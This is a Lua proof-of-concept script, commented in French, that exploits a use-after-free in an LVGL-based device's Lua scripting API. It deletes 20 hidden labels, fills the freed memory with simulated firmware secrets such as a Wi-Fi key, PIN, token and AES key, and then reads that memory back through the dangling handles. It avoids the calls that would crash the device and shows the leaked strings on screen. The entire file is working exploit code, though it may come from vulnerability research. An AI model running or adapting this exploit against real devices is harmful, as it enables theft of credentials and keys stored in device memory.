-- ============================================================================
--  POC : Dump de la RAM via multiples dangling pointers
-- ============================================================================
--
--  Strategie : creer N labels espions, les supprimer, laisser le firmware
--  reutiliser la memoire, puis lire via get_text + get_state + get_child_cnt
--  sur chaque espion pour extraire un maximum de donnees.
--
--  On evite get_width/get_height/get_x qui appellent update_layout()
--  et crashent quand l'objet n'est plus dans l'arbre LVGL.
--
-- ============================================================================

local GREEN = lv.color.hex(0x00FF41)
local RED   = lv.color.hex(0xFF0000)
local WHITE = lv.color.hex(0xFFFFFF)
local AMBER = lv.color.hex(0xFFBF00)
local DARK  = lv.color.hex(0x0a0a0a)

local function log(msg)
    print("[DUMP] " .. msg)
end

lv.obj.set_style_bg_color(window, lv.color.hex(0x000000), 0)
lv.obj.set_style_bg_opa(window, lv.OPA_COVER, 0)

-- ============================================================================
--  PHASE 1 : Creer 20 labels espions
-- ============================================================================
log("")
log("=== PHASE 1 : Creation de 20 labels espions ===")

local NUM = 20
local spies = {}

for i = 1, NUM do
    local s = lv.label.new(window)
    lv.label.set_text(s, ".")
    lv.obj.add_flag(s, lv.OBJ_FLAG_HIDDEN)
    spies[i] = s
end

log("  " .. NUM .. " labels crees et caches.")

-- ============================================================================
--  PHASE 2 : Supprimer les espions
-- ============================================================================
log("")
log("=== PHASE 2 : Suppression des 20 espions ===")

for i = 1, NUM do
    lv.obj.del(spies[i])
end

log("  Tous supprimes. 20 dangling pointers prets.")

-- ============================================================================
--  PHASE 3 : Simuler l'activite firmware avec pleins de labels
-- ============================================================================
log("")
log("=== PHASE 3 : Activite firmware (donnees variees) ===")
log("")

-- Donnees simulant ce qu'un firmware reel stockerait dans des labels
local firmware_data = {
    "WiFi: MonReseau_5G",
    "PSK: aB3$kL9!mN",
    "BLE: A4:C1:38:FF:9E",
    "Token: eyJhbGciOiJI",
    "PIN: 4729",
    "SN: FLAM-2024-00742",
    "FW: v3.2.1-rc4",
    "IMEI: 353456789012345",
    "Bat: 78% 3.82V",
    "GPS: 48.8566,2.3522",
    "User: thomas",
    "Sess: 9f3a7c1b2e8d",
    "AES: 0x4D6F6E526573",
    "HMAC: d41d8cd98f00b2",
    "Cert: SHA256:a1b2c3",
    "NTP: 2024-03-15T14:22",
    "DNS: 192.168.1.1",
    "MQTT: broker.local",
    "OTA: https://fw.flam",
    "Log: boot_count=142",
}

local fw_labels = {}
for i, text in ipairs(firmware_data) do
    fw_labels[i] = lv.label.new(window)
    lv.label.set_text(fw_labels[i], text)
    lv.obj.add_flag(fw_labels[i], lv.OBJ_FLAG_HIDDEN)
    log("  [fw] " .. text)
end

log("")

-- ============================================================================
--  PHASE 4 : Lecture via les dangling pointers
-- ============================================================================
log("=== PHASE 4 : Dump via les 20 dangling pointers ===")
log("")

-- Lire TOUT avant d'afficher quoi que ce soit a l'ecran
local reads = {}
local leak_count = 0

for i = 1, NUM do
    local r = { id = i }

    -- get_text : le plus precieux — lit la chaine texte
    local ok_t, txt = pcall(lv.label.get_text, spies[i])
    if ok_t and txt and #txt > 0 and txt ~= "." then
        r.text = txt
        leak_count = leak_count + 1
    elseif ok_t and txt == "." then
        r.text = txt
        r.residual = true  -- donnee residuelle du spy lui-meme
    end

    -- get_state : lit les flags d'etat (16 bits)
    local ok_s, state = pcall(lv.obj.get_state, spies[i])
    if ok_s then r.state = state end

    -- get_child_cnt : lit le nombre d'enfants
    local ok_c, cnt = pcall(lv.obj.get_child_cnt, spies[i])
    if ok_c then r.children = cnt end

    -- get_scroll_y : lit la position de scroll
    local ok_sy, sy = pcall(lv.obj.get_scroll_y, spies[i])
    if ok_sy then r.scroll_y = sy end

    reads[i] = r
end

-- Afficher dans la console
for i, r in ipairs(reads) do
    local parts = {}
    if r.text then
        table.insert(parts, string.format("text=\"%s\"", r.text))
    end
    if r.state and r.state ~= 0 then
        table.insert(parts, string.format("state=0x%X", r.state))
    end
    if r.children and r.children ~= 0 then
        table.insert(parts, string.format("children=%d", r.children))
    end
    if r.scroll_y and r.scroll_y ~= 0 then
        table.insert(parts, string.format("scroll_y=%d", r.scroll_y))
    end

    if #parts > 0 then
        local prefix = (r.text and not r.residual) and " ** " or "    "
        log(string.format("%s[%2d] %s", prefix, i, table.concat(parts, "  ")))
    end
end

-- ============================================================================
--  PHASE 5 : Affichage a l'ecran
-- ============================================================================

local title = lv.label.new(window)
lv.label.set_text(title, "RAM Dump — 20 dangling ptrs")
lv.obj.set_style_text_color(title, RED, 0)
lv.obj.align(title, lv.ALIGN_TOP_MID, 0, 32)

local box = lv.obj.new(window)
lv.obj.set_size(box, 305, 150)
lv.obj.align(box, lv.ALIGN_CENTER, 0, 18)
lv.obj.set_style_bg_color(box, DARK, 0)
lv.obj.set_style_bg_opa(box, lv.OPA_COVER, 0)
lv.obj.set_style_radius(box, 6, 0)
lv.obj.remove_flag(box, lv.OBJ_FLAG_SCROLLABLE)

-- Afficher seulement les fuites (donnees d'autres objets)
local y = 3
local displayed = 0

for i, r in ipairs(reads) do
    if r.text and not r.residual and displayed < 8 then
        displayed = displayed + 1
        local line = lv.label.new(box)
        local t = r.text
        if #t > 28 then t = string.sub(t, 1, 27) .. ".." end
        lv.label.set_text(line, string.format("[%02d] %s", i, t))
        lv.obj.set_style_text_color(line, GREEN, 0)
        lv.obj.align(line, lv.ALIGN_TOP_LEFT, 5, y)
        y = y + 16
    end
end

if displayed == 0 then
    local nope = lv.label.new(box)
    lv.label.set_text(nope, "Aucune fuite detectee cette fois")
    lv.obj.set_style_text_color(nope, AMBER, 0)
    lv.obj.align(nope, lv.ALIGN_TOP_LEFT, 5, y)
    y = y + 16
end

-- Verdict final
local verdict = lv.label.new(box)
lv.label.set_text(verdict, string.format(
    "%d/%d blocs : donnees firmware lues", leak_count, NUM))
lv.obj.set_style_text_color(verdict, RED, 0)
lv.obj.align(verdict, lv.ALIGN_TOP_LEFT, 5, y + 8)

log("")
log(string.format("  BILAN : %d/%d espions ont lu des donnees firmware", leak_count, NUM))
log("  Fermez la fenetre pour quitter.")
